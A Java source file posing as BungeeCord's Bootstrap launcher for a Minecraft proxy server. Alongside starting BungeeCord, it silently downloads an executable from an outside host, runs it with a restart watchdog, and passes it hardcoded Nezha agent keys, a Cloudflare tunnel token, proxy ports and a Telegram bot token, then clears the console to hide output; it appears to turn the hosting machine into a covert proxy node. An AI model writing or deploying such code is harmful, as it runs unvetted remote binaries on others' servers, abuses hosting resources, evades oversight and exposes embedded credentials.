package net.md_5.bungee;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;

public class Bootstrap
{
    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_RESET = "\033[0m";

    private static final AtomicBoolean running = new AtomicBoolean(true);

    private static Process sbxProcess;
    private static Process bungeeProcess;

    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT",
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH",
        "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT",
        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO"
    };

    public static void main(String[] args) throws Exception
    {
        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0)
        {
            System.err.println(ANSI_RED + "ERROR: Your Java version is too lower!" + ANSI_RESET);
            Thread.sleep(3000);
            System.exit(1);
        }

        try {
            runSbxBinary();
            startSbxWatchdog();

            startBungee(args);
            startBungeeWatchdog(args);

            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
            }));

            Thread.sleep(15000);
            System.out.println(ANSI_GREEN + "Server is running!" + ANSI_RESET);
            Thread.sleep(20000);
            clearConsole();

        } catch (Exception e) {
            System.err.println(ANSI_RED + "Error initializing: " + e.getMessage() + ANSI_RESET);
        }
    }

    // ============================================================
    // 自动拉起 sbx
    // ============================================================
    private static void startSbxWatchdog()
    {
        new Thread(() -> {
            while (running.get()) {
                try {
                    if (sbxProcess != null) sbxProcess.waitFor();

                    if (!running.get()) break;

                    System.out.println(ANSI_RED + "[sbx] exited, restarting in 3s..." + ANSI_RESET);
                    Thread.sleep(3000);

                    runSbxBinary();
                    System.out.println(ANSI_GREEN + "[sbx] restarted!" + ANSI_RESET);

                } catch (Exception e) {
                    System.err.println(ANSI_RED + "[sbx] restart error: " + e.getMessage() + ANSI_RESET);
                    try { Thread.sleep(3000); } catch (Exception ignored) {}
                }
            }
        }).start();
    }

    // ============================================================
    // 自动拉起 BungeeCord
    // ============================================================
    private static void startBungee(String[] args) throws Exception
    {
        ProcessBuilder pb = new ProcessBuilder(
            System.getProperty("java.home") + "/bin/java",
            "-Dbungee.main=true",
            "-jar",
            new File(Bootstrap.class.getProtectionDomain()
            .getCodeSource().getLocation().toURI()).getName()
        );

        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);

        bungeeProcess = pb.start();
    }

    private static void startBungeeWatchdog(String[] args)
    {
        new Thread(() -> {
            while (running.get()) {
                try {
                    if (bungeeProcess != null) bungeeProcess.waitFor();

                    if (!running.get()) break;

                    System.out.println(ANSI_RED + "[Bungee] exited, restarting in 5s..." + ANSI_RESET);
                    Thread.sleep(5000);

                    startBungee(args);
                    System.out.println(ANSI_GREEN + "[Bungee] restarted!" + ANSI_RESET);

                } catch (Exception e) {
                    System.err.println(ANSI_RED + "[Bungee] restart error: " + e.getMessage() + ANSI_RESET);
                    try { Thread.sleep(5000); } catch (Exception ignored) {}
                }
            }
        }).start();
    }

    // ============================================================
    // sbx
    // ============================================================
    private static void runSbxBinary() throws Exception {
        Map<String, String> envVars = new HashMap<>();
        loadEnvVars(envVars);

        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);

        sbxProcess = pb.start();
    }

    private static void loadEnvVars(Map<String, String> envVars) throws IOException {
        envVars.put("UUID", "f40de34f-cc21-46c9-bce5-92784ff0e40a");
        envVars.put("FILE_PATH", "./world");
        envVars.put("NEZHA_SERVER", "tta.wahaaz.xx.kg:80");
        envVars.put("NEZHA_PORT", "");
        envVars.put("NEZHA_KEY", "OZMtCS6G39UpEgRvzRNXjS7iDNBRmTsI");
        envVars.put("ARGO_PORT", "8003");
        envVars.put("ARGO_DOMAIN", "falixde.xozz.netlib.re");
        envVars.put("ARGO_AUTH", "eyJhIjoiOWY2ODlkYjlhZDNmM2VmMTc1MTcwNThjZjI3MTQwZTIiLCJ0IjoiNmI4NmJjNTEtN2E0ZC00MTczLWI2M2ItNTYzZDRlZWM5NjBhIiwicyI6Ik4yVmpaV1l3TmpNdE1tSTJaUzAwTjJZeExXSm1NMkl0T1dNNVpHTTFZVE5rTURJeiJ9");
        envVars.put("HY2_PORT", "26855");
        envVars.put("TUIC_PORT", "49008");
        envVars.put("REALITY_PORT", "43996");
        envVars.put("UPLOAD_URL", "");
        envVars.put("CHAT_ID", "7613313360");
        envVars.put("BOT_TOKEN", "8244051936:AAF9BxqnFQl9nSwOZZMA-dLsh-4SBldMHWA");
        envVars.put("CFIP", "cf.130519.xyz");
        envVars.put("CFPORT", "443");
        envVars.put("NAME", "falixnodes");
        envVars.put("DISABLE_ARGO", "false");

        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.isEmpty())
                envVars.put(var, value);
        }

        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            for (String line : Files.readAllLines(envFile)) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;

                line = line.split(" #")[0].split(" //")[0].trim();
                if (line.startsWith("export ")) line = line.substring(7).trim();

                String[] parts = line.split("=", 2);
                if (parts.length == 2) {
                    String key = parts[0].trim();
                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                    if (Arrays.asList(ALL_ENV_VARS).contains(key))
                        envVars.put(key, value);
                }
            }
        }
    }

    private static Path getBinaryPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;

        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = "https://amd64.ssss.nyc.mn/sbsh";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = "https://arm64.ssss.nyc.mn/sbsh";
        } else if (osArch.contains("s390x")) {
            url = "https://s390x.ssss.nyc.mn/sbsh";
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }

        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");

        if (!Files.exists(path)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            path.toFile().setExecutable(true);
        }

        return path;
    }

    private static void clearConsole() {
        try {
            if (System.getProperty("os.name").contains("Windows")) {
                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
            } else {
                System.out.print("\033[H\033[2J");
                System.out.flush();
            }
        } catch (Exception ignored) {}
    }

    private static void stopServices() {
        try {
            if (sbxProcess != null && sbxProcess.isAlive()) sbxProcess.destroy();
            if (bungeeProcess != null && bungeeProcess.isAlive()) bungeeProcess.destroy();
        } catch (Exception ignored) {}
    }
}
